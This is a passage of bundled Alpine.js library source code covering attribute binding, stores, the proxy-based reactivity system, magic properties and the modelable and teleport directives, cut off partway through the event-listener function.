  function checkedAttrLooseCompare(valueA, valueB) {
    return valueA == valueB;
  }
  function safeParseBoolean(rawValue) {
    if ([1, "1", "true", "on", "yes", true].includes(rawValue)) {
      return true;
    }
    if ([0, "0", "false", "off", "no", false].includes(rawValue)) {
      return false;
    }
    return rawValue ? Boolean(rawValue) : null;
  }
  function isBooleanAttr(attrName) {
    const booleanAttributes = [
      "disabled",
      "checked",
      "required",
      "readonly",
      "open",
      "selected",
      "autofocus",
      "itemscope",
      "multiple",
      "novalidate",
      "allowfullscreen",
      "allowpaymentrequest",
      "formnovalidate",
      "autoplay",
      "controls",
      "loop",
      "muted",
      "playsinline",
      "default",
      "ismap",
      "reversed",
      "async",
      "defer",
      "nomodule"
    ];
    return booleanAttributes.includes(attrName);
  }
  function attributeShouldntBePreservedIfFalsy(name) {
    return !["aria-pressed", "aria-checked", "aria-expanded", "aria-selected"].includes(name);
  }
  function getBinding(el, name, fallback) {
    if (el._x_bindings && el._x_bindings[name] !== void 0)
      return el._x_bindings[name];
    return getAttributeBinding(el, name, fallback);
  }
  function extractProp(el, name, fallback, extract = true) {
    if (el._x_bindings && el._x_bindings[name] !== void 0)
      return el._x_bindings[name];
    if (el._x_inlineBindings && el._x_inlineBindings[name] !== void 0) {
      let binding = el._x_inlineBindings[name];
      binding.extract = extract;
      return dontAutoEvaluateFunctions(() => {
        return evaluate(el, binding.expression);
      });
    }
    return getAttributeBinding(el, name, fallback);
  }
  function getAttributeBinding(el, name, fallback) {
    let attr = el.getAttribute(name);
    if (attr === null)
      return typeof fallback === "function" ? fallback() : fallback;
    if (attr === "")
      return true;
    if (isBooleanAttr(name)) {
      return !![name, "true"].includes(attr);
    }
    return attr;
  }
  function debounce(func, wait) {
    var timeout;
    return function() {
      var context = this, args = arguments;
      var later = function() {
        timeout = null;
        func.apply(context, args);
      };
      clearTimeout(timeout);
      timeout = setTimeout(later, wait);
    };
  }
  function throttle(func, limit) {
    let inThrottle;
    return function() {
      let context = this, args = arguments;
      if (!inThrottle) {
        func.apply(context, args);
        inThrottle = true;
        setTimeout(() => inThrottle = false, limit);
      }
    };
  }
  function entangle({ get: outerGet, set: outerSet }, { get: innerGet, set: innerSet }) {
    let firstRun = true;
    let outerHash;
    let innerHash;
    let reference = effect(() => {
      let outer = outerGet();
      let inner = innerGet();
      if (firstRun) {
        innerSet(cloneIfObject(outer));
        firstRun = false;
      } else {
        let outerHashLatest = JSON.stringify(outer);
        let innerHashLatest = JSON.stringify(inner);
        if (outerHashLatest !== outerHash) {
          innerSet(cloneIfObject(outer));
        } else if (outerHashLatest !== innerHashLatest) {
          outerSet(cloneIfObject(inner));
        } else {
        }
      }
      outerHash = JSON.stringify(outerGet());
      innerHash = JSON.stringify(innerGet());
    });
    return () => {
      release(reference);
    };
  }
  function cloneIfObject(value) {
    return typeof value === "object" ? JSON.parse(JSON.stringify(value)) : value;
  }
  function plugin(callback) {
    let callbacks = Array.isArray(callback) ? callback : [callback];
    callbacks.forEach((i) => i(alpine_default));
  }
  var stores = {};
  var isReactive = false;
  function store(name, value) {
    if (!isReactive) {
      stores = reactive(stores);
      isReactive = true;
    }
    if (value === void 0) {
      return stores[name];
    }
    stores[name] = value;
    if (typeof value === "object" && value !== null && value.hasOwnProperty("init") && typeof value.init === "function") {
      stores[name].init();
    }
    initInterceptors(stores[name]);
  }
  function getStores() {
    return stores;
  }
  var binds = {};
  function bind2(name, bindings) {
    let getBindings = typeof bindings !== "function" ? () => bindings : bindings;
    if (name instanceof Element) {
      return applyBindingsObject(name, getBindings());
    } else {
      binds[name] = getBindings;
    }
    return () => {
    };
  }
  function injectBindingProviders(obj) {
    Object.entries(binds).forEach(([name, callback]) => {
      Object.defineProperty(obj, name, {
        get() {
          return (...args) => {
            return callback(...args);
          };
        }
      });
    });
    return obj;
  }
  function applyBindingsObject(el, obj, original) {
    let cleanupRunners = [];
    while (cleanupRunners.length)
      cleanupRunners.pop()();
    let attributes = Object.entries(obj).map(([name, value]) => ({ name, value }));
    let staticAttributes = attributesOnly(attributes);
    attributes = attributes.map((attribute) => {
      if (staticAttributes.find((attr) => attr.name === attribute.name)) {
        return {
          name: `x-bind:${attribute.name}`,
          value: `"${attribute.value}"`
        };
      }
      return attribute;
    });
    directives(el, attributes, original).map((handle) => {
      cleanupRunners.push(handle.runCleanups);
      handle();
    });
    return () => {
      while (cleanupRunners.length)
        cleanupRunners.pop()();
    };
  }
  var datas = {};
  function data(name, callback) {
    datas[name] = callback;
  }
  function injectDataProviders(obj, context) {
    Object.entries(datas).forEach(([name, callback]) => {
      Object.defineProperty(obj, name, {
        get() {
          return (...args) => {
            return callback.bind(context)(...args);
          };
        },
        enumerable: false
      });
    });
    return obj;
  }
  var Alpine = {
    get reactive() {
      return reactive;
    },
    get release() {
      return release;
    },
    get effect() {
      return effect;
    },
    get raw() {
      return raw;
    },
    version: "3.14.1",
    flushAndStopDeferringMutations,
    dontAutoEvaluateFunctions,
    disableEffectScheduling,
    startObservingMutations,
    stopObservingMutations,
    setReactivityEngine,
    onAttributeRemoved,
    onAttributesAdded,
    closestDataStack,
    skipDuringClone,
    onlyDuringClone,
    addRootSelector,
    addInitSelector,
    interceptClone,
    addScopeToNode,
    deferMutations,
    mapAttributes,
    evaluateLater,
    interceptInit,
    setEvaluator,
    mergeProxies,
    extractProp,
    findClosest,
    onElRemoved,
    closestRoot,
    destroyTree,
    interceptor,
    // INTERNAL: not public API and is subject to change without major release.
    transition,
    // INTERNAL
    setStyles,
    // INTERNAL
    mutateDom,
    directive,
    entangle,
    throttle,
    debounce,
    evaluate,
    initTree,
    nextTick,
    prefixed: prefix,
    prefix: setPrefix,
    plugin,
    magic,
    store,
    start,
    clone,
    // INTERNAL
    cloneNode,
    // INTERNAL
    bound: getBinding,
    $data: scope,
    watch,
    walk,
    data,
    bind: bind2
  };
  var alpine_default = Alpine;
  function makeMap(str2, expectsLowerCase) {
    const map = /* @__PURE__ */ Object.create(null);
    const list = str2.split(",");
    for (let i = 0; i < list.length; i++) {
      map[list[i]] = true;
    }
    return expectsLowerCase ? (val) => !!map[val.toLowerCase()] : (val) => !!map[val];
  }
  var specialBooleanAttrs = `itemscope,allowfullscreen,formnovalidate,ismap,nomodule,novalidate,readonly`;
  var isBooleanAttr2 = /* @__PURE__ */ makeMap(specialBooleanAttrs + `,async,autofocus,autoplay,controls,default,defer,disabled,hidden,loop,open,required,reversed,scoped,seamless,checked,muted,multiple,selected`);
  var EMPTY_OBJ = true ? Object.freeze({}) : {};
  var EMPTY_ARR = true ? Object.freeze([]) : [];
  var hasOwnProperty = Object.prototype.hasOwnProperty;
  var hasOwn = (val, key) => hasOwnProperty.call(val, key);
  var isArray = Array.isArray;
  var isMap = (val) => toTypeString(val) === "[object Map]";
  var isString = (val) => typeof val === "string";
  var isSymbol = (val) => typeof val === "symbol";
  var isObject = (val) => val !== null && typeof val === "object";
  var objectToString = Object.prototype.toString;
  var toTypeString = (value) => objectToString.call(value);
  var toRawType = (value) => {
    return toTypeString(value).slice(8, -1);
  };
  var isIntegerKey = (key) => isString(key) && key !== "NaN" && key[0] !== "-" && "" + parseInt(key, 10) === key;
  var cacheStringFunction = (fn) => {
    const cache = /* @__PURE__ */ Object.create(null);
    return (str2) => {
      const hit = cache[str2];
      return hit || (cache[str2] = fn(str2));
    };
  };
  var camelizeRE = /-(\w)/g;
  var camelize = cacheStringFunction((str2) => {
    return str2.replace(camelizeRE, (_, c2) => c2 ? c2.toUpperCase() : "");
  });
  var hyphenateRE = /\B([A-Z])/g;
  var hyphenate = cacheStringFunction((str2) => str2.replace(hyphenateRE, "-$1").toLowerCase());
  var capitalize = cacheStringFunction((str2) => str2.charAt(0).toUpperCase() + str2.slice(1));
  var toHandlerKey = cacheStringFunction((str2) => str2 ? `on${capitalize(str2)}` : ``);
  var hasChanged = (value, oldValue) => value !== oldValue && (value === value || oldValue === oldValue);
  var targetMap = /* @__PURE__ */ new WeakMap();
  var effectStack = [];
  var activeEffect;
  var ITERATE_KEY = Symbol(true ? "iterate" : "");
  var MAP_KEY_ITERATE_KEY = Symbol(true ? "Map key iterate" : "");
  function isEffect(fn) {
    return fn && fn._isEffect === true;
  }
  function effect2(fn, options = EMPTY_OBJ) {
    if (isEffect(fn)) {
      fn = fn.raw;
    }
    const effect3 = createReactiveEffect(fn, options);
    if (!options.lazy) {
      effect3();
    }
    return effect3;
  }
  function stop(effect3) {
    if (effect3.active) {
      cleanup(effect3);
      if (effect3.options.onStop) {
        effect3.options.onStop();
      }
      effect3.active = false;
    }
  }
  var uid = 0;
  function createReactiveEffect(fn, options) {
    const effect3 = function reactiveEffect() {
      if (!effect3.active) {
        return fn();
      }
      if (!effectStack.includes(effect3)) {
        cleanup(effect3);
        try {
          enableTracking();
          effectStack.push(effect3);
          activeEffect = effect3;
          return fn();
        } finally {
          effectStack.pop();
          resetTracking();
          activeEffect = effectStack[effectStack.length - 1];
        }
      }
    };
    effect3.id = uid++;
    effect3.allowRecurse = !!options.allowRecurse;
    effect3._isEffect = true;
    effect3.active = true;
    effect3.raw = fn;
    effect3.deps = [];
    effect3.options = options;
    return effect3;
  }
  function cleanup(effect3) {
    const { deps } = effect3;
    if (deps.length) {
      for (let i = 0; i < deps.length; i++) {
        deps[i].delete(effect3);
      }
      deps.length = 0;
    }
  }
  var shouldTrack = true;
  var trackStack = [];
  function pauseTracking() {
    trackStack.push(shouldTrack);
    shouldTrack = false;
  }
  function enableTracking() {
    trackStack.push(shouldTrack);
    shouldTrack = true;
  }
  function resetTracking() {
    const last = trackStack.pop();
    shouldTrack = last === void 0 ? true : last;
  }
  function track(target, type, key) {
    if (!shouldTrack || activeEffect === void 0) {
      return;
    }
    let depsMap = targetMap.get(target);
    if (!depsMap) {
      targetMap.set(target, depsMap = /* @__PURE__ */ new Map());
    }
    let dep = depsMap.get(key);
    if (!dep) {
      depsMap.set(key, dep = /* @__PURE__ */ new Set());
    }
    if (!dep.has(activeEffect)) {
      dep.add(activeEffect);
      activeEffect.deps.push(dep);
      if (activeEffect.options.onTrack) {
        activeEffect.options.onTrack({
          effect: activeEffect,
          target,
          type,
          key
        });
      }
    }
  }
  function trigger(target, type, key, newValue, oldValue, oldTarget) {
    const depsMap = targetMap.get(target);
    if (!depsMap) {
      return;
    }
    const effects = /* @__PURE__ */ new Set();
    const add2 = (effectsToAdd) => {
      if (effectsToAdd) {
        effectsToAdd.forEach((effect3) => {
          if (effect3 !== activeEffect || effect3.allowRecurse) {
            effects.add(effect3);
          }
        });
      }
    };
    if (type === "clear") {
      depsMap.forEach(add2);
    } else if (key === "length" && isArray(target)) {
      depsMap.forEach((dep, key2) => {
        if (key2 === "length" || key2 >= newValue) {
          add2(dep);
        }
      });
    } else {
      if (key !== void 0) {
        add2(depsMap.get(key));
      }
      switch (type) {
        case "add":
          if (!isArray(target)) {
            add2(depsMap.get(ITERATE_KEY));
            if (isMap(target)) {
              add2(depsMap.get(MAP_KEY_ITERATE_KEY));
            }
          } else if (isIntegerKey(key)) {
            add2(depsMap.get("length"));
          }
          break;
        case "delete":
          if (!isArray(target)) {
            add2(depsMap.get(ITERATE_KEY));
            if (isMap(target)) {
              add2(depsMap.get(MAP_KEY_ITERATE_KEY));
            }
          }
          break;
        case "set":
          if (isMap(target)) {
            add2(depsMap.get(ITERATE_KEY));
          }
          break;
      }
    }
    const run = (effect3) => {
      if (effect3.options.onTrigger) {
        effect3.options.onTrigger({
          effect: effect3,
          target,
          key,
          type,
          newValue,
          oldValue,
          oldTarget
        });
      }
      if (effect3.options.scheduler) {
        effect3.options.scheduler(effect3);
      } else {
        effect3();
      }
    };
    effects.forEach(run);
  }
  var isNonTrackableKeys = /* @__PURE__ */ makeMap(`__proto__,__v_isRef,__isVue`);
  var builtInSymbols = new Set(Object.getOwnPropertyNames(Symbol).map((key) => Symbol[key]).filter(isSymbol));
  var get2 = /* @__PURE__ */ createGetter();
  var readonlyGet = /* @__PURE__ */ createGetter(true);
  var arrayInstrumentations = /* @__PURE__ */ createArrayInstrumentations();
  function createArrayInstrumentations() {
    const instrumentations = {};
    ["includes", "indexOf", "lastIndexOf"].forEach((key) => {
      instrumentations[key] = function(...args) {
        const arr = toRaw(this);
        for (let i = 0, l = this.length; i < l; i++) {
          track(arr, "get", i + "");
        }
        const res = arr[key](...args);
        if (res === -1 || res === false) {
          return arr[key](...args.map(toRaw));
        } else {
          return res;
        }
      };
    });
    ["push", "pop", "shift", "unshift", "splice"].forEach((key) => {
      instrumentations[key] = function(...args) {
        pauseTracking();
        const res = toRaw(this)[key].apply(this, args);
        resetTracking();
        return res;
      };
    });
    return instrumentations;
  }
  function createGetter(isReadonly = false, shallow = false) {
    return function get3(target, key, receiver) {
      if (key === "__v_isReactive") {
        return !isReadonly;
      } else if (key === "__v_isReadonly") {
        return isReadonly;
      } else if (key === "__v_raw" && receiver === (isReadonly ? shallow ? shallowReadonlyMap : readonlyMap : shallow ? shallowReactiveMap : reactiveMap).get(target)) {
        return target;
      }
      const targetIsArray = isArray(target);
      if (!isReadonly && targetIsArray && hasOwn(arrayInstrumentations, key)) {
        return Reflect.get(arrayInstrumentations, key, receiver);
      }
      const res = Reflect.get(target, key, receiver);
      if (isSymbol(key) ? builtInSymbols.has(key) : isNonTrackableKeys(key)) {
        return res;
      }
      if (!isReadonly) {
        track(target, "get", key);
      }
      if (shallow) {
        return res;
      }
      if (isRef(res)) {
        const shouldUnwrap = !targetIsArray || !isIntegerKey(key);
        return shouldUnwrap ? res.value : res;
      }
      if (isObject(res)) {
        return isReadonly ? readonly(res) : reactive2(res);
      }
      return res;
    };
  }
  var set2 = /* @__PURE__ */ createSetter();
  function createSetter(shallow = false) {
    return function set3(target, key, value, receiver) {
      let oldValue = target[key];
      if (!shallow) {
        value = toRaw(value);
        oldValue = toRaw(oldValue);
        if (!isArray(target) && isRef(oldValue) && !isRef(value)) {
          oldValue.value = value;
          return true;
        }
      }
      const hadKey = isArray(target) && isIntegerKey(key) ? Number(key) < target.length : hasOwn(target, key);
      const result = Reflect.set(target, key, value, receiver);
      if (target === toRaw(receiver)) {
        if (!hadKey) {
          trigger(target, "add", key, value);
        } else if (hasChanged(value, oldValue)) {
          trigger(target, "set", key, value, oldValue);
        }
      }
      return result;
    };
  }
  function deleteProperty(target, key) {
    const hadKey = hasOwn(target, key);
    const oldValue = target[key];
    const result = Reflect.deleteProperty(target, key);
    if (result && hadKey) {
      trigger(target, "delete", key, void 0, oldValue);
    }
    return result;
  }
  function has(target, key) {
    const result = Reflect.has(target, key);
    if (!isSymbol(key) || !builtInSymbols.has(key)) {
      track(target, "has", key);
    }
    return result;
  }
  function ownKeys(target) {
    track(target, "iterate", isArray(target) ? "length" : ITERATE_KEY);
    return Reflect.ownKeys(target);
  }
  var mutableHandlers = {
    get: get2,
    set: set2,
    deleteProperty,
    has,
    ownKeys
  };
  var readonlyHandlers = {
    get: readonlyGet,
    set(target, key) {
      if (true) {
        console.warn(`Set operation on key "${String(key)}" failed: target is readonly.`, target);
      }
      return true;
    },
    deleteProperty(target, key) {
      if (true) {
        console.warn(`Delete operation on key "${String(key)}" failed: target is readonly.`, target);
      }
      return true;
    }
  };
  var toReactive = (value) => isObject(value) ? reactive2(value) : value;
  var toReadonly = (value) => isObject(value) ? readonly(value) : value;
  var toShallow = (value) => value;
  var getProto = (v) => Reflect.getPrototypeOf(v);
  function get$1(target, key, isReadonly = false, isShallow = false) {
    target = target[
      "__v_raw"
      /* RAW */
    ];
    const rawTarget = toRaw(target);
    const rawKey = toRaw(key);
    if (key !== rawKey) {
      !isReadonly && track(rawTarget, "get", key);
    }
    !isReadonly && track(rawTarget, "get", rawKey);
    const { has: has2 } = getProto(rawTarget);
    const wrap = isShallow ? toShallow : isReadonly ? toReadonly : toReactive;
    if (has2.call(rawTarget, key)) {
      return wrap(target.get(key));
    } else if (has2.call(rawTarget, rawKey)) {
      return wrap(target.get(rawKey));
    } else if (target !== rawTarget) {
      target.get(key);
    }
  }
  function has$1(key, isReadonly = false) {
    const target = this[
      "__v_raw"
      /* RAW */
    ];
    const rawTarget = toRaw(target);
    const rawKey = toRaw(key);
    if (key !== rawKey) {
      !isReadonly && track(rawTarget, "has", key);
    }
    !isReadonly && track(rawTarget, "has", rawKey);
    return key === rawKey ? target.has(key) : target.has(key) || target.has(rawKey);
  }
  function size(target, isReadonly = false) {
    target = target[
      "__v_raw"
      /* RAW */
    ];
    !isReadonly && track(toRaw(target), "iterate", ITERATE_KEY);
    return Reflect.get(target, "size", target);
  }
  function add(value) {
    value = toRaw(value);
    const target = toRaw(this);
    const proto = getProto(target);
    const hadKey = proto.has.call(target, value);
    if (!hadKey) {
      target.add(value);
      trigger(target, "add", value, value);
    }
    return this;
  }
  function set$1(key, value) {
    value = toRaw(value);
    const target = toRaw(this);
    const { has: has2, get: get3 } = getProto(target);
    let hadKey = has2.call(target, key);
    if (!hadKey) {
      key = toRaw(key);
      hadKey = has2.call(target, key);
    } else if (true) {
      checkIdentityKeys(target, has2, key);
    }
    const oldValue = get3.call(target, key);
    target.set(key, value);
    if (!hadKey) {
      trigger(target, "add", key, value);
    } else if (hasChanged(value, oldValue)) {
      trigger(target, "set", key, value, oldValue);
    }
    return this;
  }
  function deleteEntry(key) {
    const target = toRaw(this);
    const { has: has2, get: get3 } = getProto(target);
    let hadKey = has2.call(target, key);
    if (!hadKey) {
      key = toRaw(key);
      hadKey = has2.call(target, key);
    } else if (true) {
      checkIdentityKeys(target, has2, key);
    }
    const oldValue = get3 ? get3.call(target, key) : void 0;
    const result = target.delete(key);
    if (hadKey) {
      trigger(target, "delete", key, void 0, oldValue);
    }
    return result;
  }
  function clear() {
    const target = toRaw(this);
    const hadItems = target.size !== 0;
    const oldTarget = true ? isMap(target) ? new Map(target) : new Set(target) : void 0;
    const result = target.clear();
    if (hadItems) {
      trigger(target, "clear", void 0, void 0, oldTarget);
    }
    return result;
  }
  function createForEach(isReadonly, isShallow) {
    return function forEach2(callback, thisArg) {
      const observed = this;
      const target = observed[
        "__v_raw"
        /* RAW */
      ];
      const rawTarget = toRaw(target);
      const wrap = isShallow ? toShallow : isReadonly ? toReadonly : toReactive;
      !isReadonly && track(rawTarget, "iterate", ITERATE_KEY);
      return target.forEach((value, key) => {
        return callback.call(thisArg, wrap(value), wrap(key), observed);
      });
    };
  }
  function createIterableMethod(method, isReadonly, isShallow) {
    return function(...args) {
      const target = this[
        "__v_raw"
        /* RAW */
      ];
      const rawTarget = toRaw(target);
      const targetIsMap = isMap(rawTarget);
      const isPair = method === "entries" || method === Symbol.iterator && targetIsMap;
      const isKeyOnly = method === "keys" && targetIsMap;
      const innerIterator = target[method](...args);
      const wrap = isShallow ? toShallow : isReadonly ? toReadonly : toReactive;
      !isReadonly && track(rawTarget, "iterate", isKeyOnly ? MAP_KEY_ITERATE_KEY : ITERATE_KEY);
      return {
        // iterator protocol
        next() {
          const { value, done } = innerIterator.next();
          return done ? { value, done } : {
            value: isPair ? [wrap(value[0]), wrap(value[1])] : wrap(value),
            done
          };
        },
        // iterable protocol
        [Symbol.iterator]() {
          return this;
        }
      };
    };
  }
  function createReadonlyMethod(type) {
    return function(...args) {
      if (true) {
        const key = args[0] ? `on key "${args[0]}" ` : ``;
        console.warn(`${capitalize(type)} operation ${key}failed: target is readonly.`, toRaw(this));
      }
      return type === "delete" ? false : this;
    };
  }
  function createInstrumentations() {
    const mutableInstrumentations2 = {
      get(key) {
        return get$1(this, key);
      },
      get size() {
        return size(this);
      },
      has: has$1,
      add,
      set: set$1,
      delete: deleteEntry,
      clear,
      forEach: createForEach(false, false)
    };
    const shallowInstrumentations2 = {
      get(key) {
        return get$1(this, key, false, true);
      },
      get size() {
        return size(this);
      },
      has: has$1,
      add,
      set: set$1,
      delete: deleteEntry,
      clear,
      forEach: createForEach(false, true)
    };
    const readonlyInstrumentations2 = {
      get(key) {
        return get$1(this, key, true);
      },
      get size() {
        return size(this, true);
      },
      has(key) {
        return has$1.call(this, key, true);
      },
      add: createReadonlyMethod(
        "add"
        /* ADD */
      ),
      set: createReadonlyMethod(
        "set"
        /* SET */
      ),
      delete: createReadonlyMethod(
        "delete"
        /* DELETE */
      ),
      clear: createReadonlyMethod(
        "clear"
        /* CLEAR */
      ),
      forEach: createForEach(true, false)
    };
    const shallowReadonlyInstrumentations2 = {
      get(key) {
        return get$1(this, key, true, true);
      },
      get size() {
        return size(this, true);
      },
      has(key) {
        return has$1.call(this, key, true);
      },
      add: createReadonlyMethod(
        "add"
        /* ADD */
      ),
      set: createReadonlyMethod(
        "set"
        /* SET */
      ),
      delete: createReadonlyMethod(
        "delete"
        /* DELETE */
      ),
      clear: createReadonlyMethod(
        "clear"
        /* CLEAR */
      ),
      forEach: createForEach(true, true)
    };
    const iteratorMethods = ["keys", "values", "entries", Symbol.iterator];
    iteratorMethods.forEach((method) => {
      mutableInstrumentations2[method] = createIterableMethod(method, false, false);
      readonlyInstrumentations2[method] = createIterableMethod(method, true, false);
      shallowInstrumentations2[method] = createIterableMethod(method, false, true);
      shallowReadonlyInstrumentations2[method] = createIterableMethod(method, true, true);
    });
    return [
      mutableInstrumentations2,
      readonlyInstrumentations2,
      shallowInstrumentations2,
      shallowReadonlyInstrumentations2
    ];
  }
  var [mutableInstrumentations, readonlyInstrumentations, shallowInstrumentations, shallowReadonlyInstrumentations] = /* @__PURE__ */ createInstrumentations();
  function createInstrumentationGetter(isReadonly, shallow) {
    const instrumentations = shallow ? isReadonly ? shallowReadonlyInstrumentations : shallowInstrumentations : isReadonly ? readonlyInstrumentations : mutableInstrumentations;
    return (target, key, receiver) => {
      if (key === "__v_isReactive") {
        return !isReadonly;
      } else if (key === "__v_isReadonly") {
        return isReadonly;
      } else if (key === "__v_raw") {
        return target;
      }
      return Reflect.get(hasOwn(instrumentations, key) && key in target ? instrumentations : target, key, receiver);
    };
  }
  var mutableCollectionHandlers = {
    get: /* @__PURE__ */ createInstrumentationGetter(false, false)
  };
  var readonlyCollectionHandlers = {
    get: /* @__PURE__ */ createInstrumentationGetter(true, false)
  };
  function checkIdentityKeys(target, has2, key) {
    const rawKey = toRaw(key);
    if (rawKey !== key && has2.call(target, rawKey)) {
      const type = toRawType(target);
      console.warn(`Reactive ${type} contains both the raw and reactive versions of the same object${type === `Map` ? ` as keys` : ``}, which can lead to inconsistencies. Avoid differentiating between the raw and reactive versions of an object and only use the reactive version if possible.`);
    }
  }
  var reactiveMap = /* @__PURE__ */ new WeakMap();
  var shallowReactiveMap = /* @__PURE__ */ new WeakMap();
  var readonlyMap = /* @__PURE__ */ new WeakMap();
  var shallowReadonlyMap = /* @__PURE__ */ new WeakMap();
  function targetTypeMap(rawType) {
    switch (rawType) {
      case "Object":
      case "Array":
        return 1;
      case "Map":
      case "Set":
      case "WeakMap":
      case "WeakSet":
        return 2;
      default:
        return 0;
    }
  }
  function getTargetType(value) {
    return value[
      "__v_skip"
      /* SKIP */
    ] || !Object.isExtensible(value) ? 0 : targetTypeMap(toRawType(value));
  }
  function reactive2(target) {
    if (target && target[
      "__v_isReadonly"
      /* IS_READONLY */
    ]) {
      return target;
    }
    return createReactiveObject(target, false, mutableHandlers, mutableCollectionHandlers, reactiveMap);
  }
  function readonly(target) {
    return createReactiveObject(target, true, readonlyHandlers, readonlyCollectionHandlers, readonlyMap);
  }
  function createReactiveObject(target, isReadonly, baseHandlers, collectionHandlers, proxyMap) {
    if (!isObject(target)) {
      if (true) {
        console.warn(`value cannot be made reactive: ${String(target)}`);
      }
      return target;
    }
    if (target[
      "__v_raw"
      /* RAW */
    ] && !(isReadonly && target[
      "__v_isReactive"
      /* IS_REACTIVE */
    ])) {
      return target;
    }
    const existingProxy = proxyMap.get(target);
    if (existingProxy) {
      return existingProxy;
    }
    const targetType = getTargetType(target);
    if (targetType === 0) {
      return target;
    }
    const proxy = new Proxy(target, targetType === 2 ? collectionHandlers : baseHandlers);
    proxyMap.set(target, proxy);
    return proxy;
  }
  function toRaw(observed) {
    return observed && toRaw(observed[
      "__v_raw"
      /* RAW */
    ]) || observed;
  }
  function isRef(r2) {
    return Boolean(r2 && r2.__v_isRef === true);
  }
  magic("nextTick", () => nextTick);
  magic("dispatch", (el) => dispatch.bind(dispatch, el));
  magic("watch", (el, { evaluateLater: evaluateLater2, cleanup: cleanup2 }) => (key, callback) => {
    let evaluate2 = evaluateLater2(key);
    let getter = () => {
      let value;
      evaluate2((i) => value = i);
      return value;
    };
    let unwatch = watch(getter, callback);
    cleanup2(unwatch);
  });
  magic("store", getStores);
  magic("data", (el) => scope(el));
  magic("root", (el) => closestRoot(el));
  magic("refs", (el) => {
    if (el._x_refs_proxy)
      return el._x_refs_proxy;
    el._x_refs_proxy = mergeProxies(getArrayOfRefObject(el));
    return el._x_refs_proxy;
  });
  function getArrayOfRefObject(el) {
    let refObjects = [];
    findClosest(el, (i) => {
      if (i._x_refs)
        refObjects.push(i._x_refs);
    });
    return refObjects;
  }
  var globalIdMemo = {};
  function findAndIncrementId(name) {
    if (!globalIdMemo[name])
      globalIdMemo[name] = 0;
    return ++globalIdMemo[name];
  }
  function closestIdRoot(el, name) {
    return findClosest(el, (element) => {
      if (element._x_ids && element._x_ids[name])
        return true;
    });
  }
  function setIdRoot(el, name) {
    if (!el._x_ids)
      el._x_ids = {};
    if (!el._x_ids[name])
      el._x_ids[name] = findAndIncrementId(name);
  }
  magic("id", (el, { cleanup: cleanup2 }) => (name, key = null) => {
    let cacheKey = `${name}${key ? `-${key}` : ""}`;
    return cacheIdByNameOnElement(el, cacheKey, cleanup2, () => {
      let root = closestIdRoot(el, name);
      let id = root ? root._x_ids[name] : findAndIncrementId(name);
      return key ? `${name}-${id}-${key}` : `${name}-${id}`;
    });
  });
  interceptClone((from, to) => {
    if (from._x_id) {
      to._x_id = from._x_id;
    }
  });
  function cacheIdByNameOnElement(el, cacheKey, cleanup2, callback) {
    if (!el._x_id)
      el._x_id = {};
    if (el._x_id[cacheKey])
      return el._x_id[cacheKey];
    let output = callback();
    el._x_id[cacheKey] = output;
    cleanup2(() => {
      delete el._x_id[cacheKey];
    });
    return output;
  }
  magic("el", (el) => el);
  warnMissingPluginMagic("Focus", "focus", "focus");
  warnMissingPluginMagic("Persist", "persist", "persist");
  function warnMissingPluginMagic(name, magicName, slug) {
    magic(magicName, (el) => warn(`You can't use [$${magicName}] without first installing the "${name}" plugin here: https://alpinejs.dev/plugins/${slug}`, el));
  }
  directive("modelable", (el, { expression }, { effect: effect3, evaluateLater: evaluateLater2, cleanup: cleanup2 }) => {
    let func = evaluateLater2(expression);
    let innerGet = () => {
      let result;
      func((i) => result = i);
      return result;
    };
    let evaluateInnerSet = evaluateLater2(`${expression} = __placeholder`);
    let innerSet = (val) => evaluateInnerSet(() => {
    }, { scope: { "__placeholder": val } });
    let initialValue = innerGet();
    innerSet(initialValue);
    queueMicrotask(() => {
      if (!el._x_model)
        return;
      el._x_removeModelListeners["default"]();
      let outerGet = el._x_model.get;
      let outerSet = el._x_model.set;
      let releaseEntanglement = entangle(
        {
          get() {
            return outerGet();
          },
          set(value) {
            outerSet(value);
          }
        },
        {
          get() {
            return innerGet();
          },
          set(value) {
            innerSet(value);
          }
        }
      );
      cleanup2(releaseEntanglement);
    });
  });
  directive("teleport", (el, { modifiers, expression }, { cleanup: cleanup2 }) => {
    if (el.tagName.toLowerCase() !== "template")
      warn("x-teleport can only be used on a <template> tag", el);
    let target = getTarget2(expression);
    let clone2 = el.content.cloneNode(true).firstElementChild;
    el._x_teleport = clone2;
    clone2._x_teleportBack = el;
    el.setAttribute("data-teleport-template", true);
    clone2.setAttribute("data-teleport-target", true);
    if (el._x_forwardEvents) {
      el._x_forwardEvents.forEach((eventName) => {
        clone2.addEventListener(eventName, (e) => {
          e.stopPropagation();
          el.dispatchEvent(new e.constructor(e.type, e));
        });
      });
    }
    addScopeToNode(clone2, {}, el);
    let placeInDom = (clone3, target2, modifiers2) => {
      if (modifiers2.includes("prepend")) {
        target2.parentNode.insertBefore(clone3, target2);
      } else if (modifiers2.includes("append")) {
        target2.parentNode.insertBefore(clone3, target2.nextSibling);
      } else {
        target2.appendChild(clone3);
      }
    };
    mutateDom(() => {
      placeInDom(clone2, target, modifiers);
      skipDuringClone(() => {
        initTree(clone2);
        clone2._x_ignore = true;
      })();
    });
    el._x_teleportPutBack = () => {
      let target2 = getTarget2(expression);
      mutateDom(() => {
        placeInDom(el._x_teleport, target2, modifiers);
      });
    };
    cleanup2(() => clone2.remove());
  });
  var teleportContainerDuringClone = document.createElement("div");
  function getTarget2(expression) {
    let target = skipDuringClone(() => {
      return document.querySelector(expression);
    }, () => {
      return teleportContainerDuringClone;
    })();
    if (!target)
      warn(`Cannot find x-teleport element for selector: "${expression}"`);
    return target;
  }
  var handler = () => {
  };
  handler.inline = (el, { modifiers }, { cleanup: cleanup2 }) => {
    modifiers.includes("self") ? el._x_ignoreSelf = true : el._x_ignore = true;
    cleanup2(() => {
      modifiers.includes("self") ? delete el._x_ignoreSelf : delete el._x_ignore;
    });
  };
  directive("ignore", handler);
  directive("effect", skipDuringClone((el, { expression }, { effect: effect3 }) => {
    effect3(evaluateLater(el, expression));
  }));
  function on(el, event, modifiers, callback) {
    let listenerTarget = el;
    let handler4 = (e) => callback(e);
    let options = {};
    let wrapHandler = (callback2, wrapper) => (e) => wrapper(callback2, e);
    if (modifiers.includes("dot"))
      event = dotSyntax(event);
    if (modifiers.includes("camel"))
      event = camelCase2(event);
    if (modifiers.includes("passive"))
      options.passive = true;
    if (modifiers.includes("capture"))
      options.capture = true;
    if (modifiers.includes("window"))
      listenerTarget = window;
    if (modifiers.includes("document"))
      listenerTarget = document;
    if (modifiers.includes("debounce")) {
